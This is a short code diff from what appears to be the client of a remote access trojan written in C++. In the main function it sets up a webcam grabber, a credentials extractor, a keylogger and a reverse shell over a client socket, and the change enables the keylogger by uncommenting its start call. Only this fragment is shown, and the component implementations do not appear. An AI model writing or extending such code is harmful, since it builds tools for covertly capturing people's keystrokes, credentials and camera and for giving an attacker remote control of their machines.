@@ -41,7 +41,7 @@ int main(int argc = 0, char *argv[] = nullptr) {
             WebcamManager webcamManager(clientSocket, download);
             CredentialsExtractor credentialsExtractor(clientSocket, download);
             KeyLogger keyLogger(clientSocket, download);
-           // keyLogger.tryStart();
+            keyLogger.tryStart();
             ReverseShell reverseShell(clientSocket);
             Permission permission(clientSocket);
             MessageBoxGUI messageBoxGui(clientSocket);
